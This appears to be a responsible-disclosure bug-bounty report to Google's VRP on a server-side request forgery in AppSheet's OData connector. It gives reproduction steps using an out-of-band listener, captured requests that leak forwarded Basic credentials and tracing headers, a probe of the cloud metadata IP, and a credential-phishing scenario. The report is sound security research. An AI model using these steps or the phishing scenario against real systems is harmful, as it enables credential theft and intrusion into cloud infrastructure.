# Google VRP Submission — F002

## TITLE

**Server-Side Request Forgery in the AppSheet OData Data Connector — Confirmed Server-Side Fetch from GCP Backend, OData Credentials Forwarded (`Authorization: Basic`) and Internal `Traceparent` Header Leaked to Attacker**

---

## AFFECTED COMPONENT

| Field | Value |
|-------|-------|
| **Product** | Google AppSheet — OData data connector ("Test" / metadata validation) |
| **Entry point** | AppSheet → Account → *Add OData connection information* → **OData Service Root URL** → **Test** |
| **Backend origin observed** | `35.203.182.241` (Google Cloud Platform — AppSheet backend) |
| **DNS resolvers observed** | `192.178.118.x` (Google LLC, AS15169) |
| **Scope** | `appsheet.com` — in scope for Google VRP (AppSheet, TIER0) |
| **Vulnerability class** | SSRF (CWE-918) + Sensitive Information Exposure (CWE-200) — credential/header forwarding |
| **Severity** | High — CVSS 3.1 7.7 (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`); see honest *Confirmed vs. Potential* breakdown below |

---

## SUMMARY

When a user clicks **Test** on an OData data connector, AppSheet's GCP backend makes a
server-side HTTP(S) request to the user-supplied *OData Service Root URL*. No SSRF
protection (IP allow/blocklist or metadata-endpoint filter) is applied to that outbound
client, and the request **forwards the user-supplied OData credentials verbatim** in an
`Authorization: Basic` header plus an internal W3C `Traceparent` tracing header.

Pointing the URL at an attacker-controlled server produces a full server-side fetch from
AppSheet's GCP backend (`35.203.182.241`) carrying those headers. The GCP Instance
Metadata Service (`169.254.169.254`) is also **TCP-reachable** from the backend pod.

Two things are reported here, with clearly separated confidence levels:

1. **Confirmed:** a working SSRF (server-side fetch from GCP infra) that **leaks the
   OData credentials and an internal tracing header** to an attacker-controlled
   destination, with no auth/rate-limit/IP protection on the connector test.
2. **Documented risk (not exploited):** IMDS at `169.254.169.254:443` is reachable at the
   TCP layer from the backend. This is reported as network-reachability evidence — **no
   metadata token was retrieved**, and the redirect path that would be required to reach
   it was tested and is currently **blocked** (see below).

---

## STEPS TO REPRODUCE

A free AppSheet account is sufficient. No paid plan required.

```bash
# Step 1 — Start an out-of-band HTTP listener
interactsh-client -server oast.pro 2>&1 | tee /tmp/oob.log &
sleep 3
OOB_URL=$(grep -o '[a-z0-9]*\.oast\.pro' /tmp/oob.log | head -1)
echo "OOB: https://${OOB_URL}"
```

```
# Step 2 — In AppSheet (free account): Account → Add OData connection information
#   OData Version       : 4.0
#   OData Service Root URL : https://<OOB_URL>
#   Username            : testuser
#   Password            : testpass1234
#   → click "Test"
```

```bash
# Step 3 — Observe the out-of-band interaction
grep -E "(DNS|HTTP) interaction" /tmp/oob.log
#   Received DNS  interaction (A) from 192.178.118.x   ← Google resolver (AS15169)
#   Received HTTP interaction       from 35.203.182.241 ← GCP AppSheet backend
```

---

## EVIDENCE ALREADY CAPTURED

### 0. Live re-verification — independent reproduction (2026-06-16 11:43 UTC)

Reproduced from scratch on a clean `interactsh` listener
(`d8ojc9269r86mkep7ev0w7czbi1ekqwc8.oast.site`), free AppSheet account, OData form
Username `Tester ` / Password `Tester1234`, single **Test** click:

```http
GET /$metadata HTTP/1.1                       ← from 35.247.115.29 (GCP)
Authorization: Basic VGVzdGVyIDpUZXN0ZXIxMjM0  ← base64 "Tester :Tester1234" (creds verbatim)
Traceparent: 00-1a14b417be862518f5c02dc9367ae9ed-b03449d2b460c160-00
```
DNS from `192.178.118.92/93/86` (Google, AS15169). Error in UI reflected the response
content type (`text/html; charset=utf-8`). Confirms: server-side fetch from GCP, credential
forwarding, internal trace-header leak, and response reflection — all reproduced ~24h after
the original capture, from a different GCP fleet IP.

### 1. Full server-side HTTP request received from the GCP backend

Test payload `https://<OOB_URL>` with Username `testuser` / Password `testpass1234`.
Request received from **`35.203.182.241` (GCP)**:

```http
GET /$metadata HTTP/1.1
Host: <OOB_URL>
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3MxMjM0
Traceparent: 00-211b255bb8beb7038f9d6aa505737d77-f9f0355422fff952-00
```

- **`Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3MxMjM0`** → base64-decodes to
  `testuser:testpass1234`. The OData credentials entered in the form are forwarded
  verbatim to the destination server.
- **`Traceparent: 00-211b255bb8beb7038f9d6aa505737d77-...`** → AppSheet's internal W3C
  distributed-tracing ID, leaking backend trace infrastructure and proving the request is
  genuinely server-side (not browser-initiated).
- AppSheet appends `/$metadata` to the configured URL (standard OData discovery), so an
  attacker server at the root path receives the credentials immediately on **Test**.

**DNS/HTTP origins (all Google infrastructure):**
```
DNS  (A)    from 192.178.118.93  — Google LLC, AS15169
DNS  (AAAA) from 192.178.118.80  — Google LLC, AS15169
HTTP GET    from 35.203.182.241  — Google Cloud Platform (AppSheet backend)
```

### 2. Response content reflected back in the error (semi-blind confirmation)

The OOB server replied `text/html`; AppSheet's error echoed it:

```
A supported MIME type could not be found that matches the content type of the response.
None of the supported type(s) ... matches the content type 'text/html; charset=utf-8'.
```

The backend received and partially parsed the attacker server's HTTP response — confirming
a true round-trip, not merely a fire-and-forget request.

### 3. IMDS TCP reachability (documented risk — NOT an exploited credential read)

Test payload `https://169.254.169.254`:

```
Error: Failed to obtain the OData feed's metadata.
Message : The SSL connection could not be established, see inner exception.
```

This differs categorically from the client-side rejection (*"Connection must be established
using HTTPS for security reasons"*) returned for bare `http://` URLs. *"The SSL connection
could not be established"* is a .NET `HttpRequestException` thrown **after** the TCP
connection is initiated — i.e., the backend opened a socket to `169.254.169.254:443` and
failed only at TLS negotiation (IMDS serves no TLS certificate).

**What this proves:** the link-local GCP metadata address is reachable at the network layer
from the AppSheet backend pod; there is no IP-level egress firewall blocking it.

**What this does NOT prove and was NOT done:** no metadata token was retrieved. No IMDS
credential read, no internal port probing, and no redirect chaining were performed.

### 4. The IMDS redirect-escalation path was tested and is currently BLOCKED

To reach the HTTP-only IMDS from the HTTPS-only URL field, an attacker would need the
backend to follow an HTTPS→HTTP cross-scheme redirect. This was tested on both connector
versions and **blocked**:

- OData v4 (`Microsoft.OData.Client`): 302 HTTPS→HTTP → *"OData web request error (Found)"* — redirect not followed.
- OData v2 (`Microsoft.Data.Services.Client`): same 302 → same block.

Both use a .NET `HttpClient` that does not follow cross-scheme (HTTPS→HTTP) redirects.
**IMDS reachability therefore remains a latent risk gated by this behavior — it is not a
working exploit today.** It is reported so the team can decide whether to also add an
IP-level egress control (defence in depth) rather than relying solely on the redirect
behavior of the HTTP client.

---

## ATTACK SCENARIOS

### Scenario A — Confirmed: SSRF + internal-header / credential leak
1. Attacker registers a free AppSheet account.
2. Sets *OData Service Root URL* to `https://<attacker-server>/`, enters credentials, clicks **Test**.
3. AppSheet's GCP backend (`35.203.182.241`) sends `GET /$metadata` with `Authorization: Basic …` and `Traceparent: …`.
4. Attacker receives proof of server-side fetch from Google infrastructure plus the internal trace header — an SSRF primitive into AppSheet's GCP network with response reflection.

### Scenario B — Confirmed primitive: OData-credential phishing via shared connector
1. Attacker publishes an OData connector "template/tutorial" whose Service Root URL points at the attacker's server.
2. A victim follows it and enters their **real** OData service credentials.
3. On **Test**, AppSheet's backend forwards the victim's credentials to the attacker in `Authorization: Basic`.
4. Attacker harvests the victim's real OData credentials with no browser interaction on the attacker side. *(Requires the victim to configure the attacker URL — `UI:R` for this variant.)*

---

## IMPACT — CONFIRMED vs. POTENTIAL

| # | Claim | Status |
|---|-------|--------|
| 1 | Server-side HTTP fetch from GCP backend `35.203.182.241` to attacker URL | **Confirmed** |
| 2 | DNS resolution by Google resolvers (`192.178.118.x`, AS15169) | **Confirmed** |
| 3 | OData credentials forwarded in `Authorization: Basic` | **Confirmed** |
| 4 | Internal `Traceparent` trace ID leaked | **Confirmed** |
| 5 | Attacker-server response content-type reflected in error | **Confirmed** |
| 6 | No auth / rate-limit / IP restriction on the connector Test | **Confirmed** |
| 7 | `169.254.169.254:443` reachable at TCP layer from backend | **Confirmed (reachability only)** |
| 8 | IMDS token read / GCP service-account compromise | **NOT attempted — latent risk; redirect path blocked (§4)** |

---

## CVSS 3.1

**Reported (confirmed SSRF + credential/header forwarding):**
`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.7 (High)**

Rationale for `S:C`: the vulnerable component (AppSheet web app) is leveraged to act
within AppSheet's internal GCP network, a different security scope. `C:H` reflects
forwarding of credentials to an attacker-chosen destination plus internal trace
disclosure and response reflection from GCP infrastructure.

**Conservative floor (semi-blind SSRF + internal-header leak only, treating confidentiality
as Low):** `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N` = **5.0 (Medium)**.

**IMDS escalation is intentionally NOT priced in** — it is a documented reachability risk,
not an exploited path (the required HTTPS→HTTP redirect is currently blocked, §4).

---

## SUGGESTED FIX

1. **SSRF egress control on the backend HTTP client (primary).** Before connecting,
   resolve the destination and **block link-local (`169.254.0.0/16`), loopback
   (`127.0.0.0/8`), and RFC1918 ranges**, plus the GCP metadata IP/hostname. Re-validate
   the resolved IP after every redirect to prevent DNS-rebinding / redirect bypass.
2. **Do not forward credentials/tracing headers to untrusted destinations.** Only attach
   `Authorization` after the destination has passed the egress allow check; never propagate
   the internal `Traceparent` header on outbound user-directed fetches.
3. **Disable cross-scheme redirect following** on the OData HTTP client (keep the current
   safe behavior explicit), and cap redirect count.
4. **Stop reflecting the response content-type in error messages** — it confirms backend
   connectivity to arbitrary hosts.
5. **Rate-limit / authenticate the connector Test** action per account.

---

## DEDUPLICATION — NET-NEW, DISTINCT FROM PRIOR AppSheet SSRF

Full analysis: [`F002-dedup-CVE-2023-4212.md`](./F002-dedup-CVE-2023-4212.md).

**Closest prior art — 2021 AppSheet webhook SSRF (Google VRP, ~$6,267):** that report
abused the **webhook automation** feature, where the webhook HTTP client *followed* a
cross-scheme redirect (POST→GET) into `169.254.169.254` and retrieved a GCP metadata
**token**. It was point-fixed in the **webhook** code path (legacy metadata endpoint +
`Metadata-Flavor` / `X-Google-Metadata-Request` headers).

F002 is a **different component** — the **OData data connector** — using a different backend
client (.NET `Microsoft.OData.Client`) that, unlike the 2021 webhook client, **does not
follow HTTPS→HTTP redirects** (tested, §4). Critically, F002 shows that **no centralized
IP-level egress control was ever added**: in 2026 the OData connector backend still reaches
`169.254.169.254` at the TCP layer, gated only by the .NET client's incidental redirect
behavior — not a deliberate SSRF defense. F002 also adds a **novel** credential/`Traceparent`
forwarding primitive absent from the 2021 report. This is a distinct vulnerability in a
distinct subsystem and demonstrates the earlier fix was not generalized.

The 2022 AppSheet deserialization RCE ($10k) is in the **Automation Bot** subsystem
(deserialization → RCE), unrelated to this SSRF. **CVE-2023-4212 is unrelated entirely** — a
Trane thermostat command-injection bug (physical USB) that earlier notes mislabeled as a
"prior AppSheet SSRF"; that citation has been corrected.

---

## NOTES FOR TRIAGE

- Reproducible with a free account; only attacker-owned credentials/servers were used.
- No GCP metadata token was retrieved; IMDS testing stopped at TCP-reachability evidence.
- No internal port probing or redirect chaining was performed.

---

*Reporter: zahinshahriar3@gmail.com*
*Report date: 2026-06-16*
*Submit at: https://bughunters.google.com/report → Google VRP → AppSheet (`appsheet.com`)*
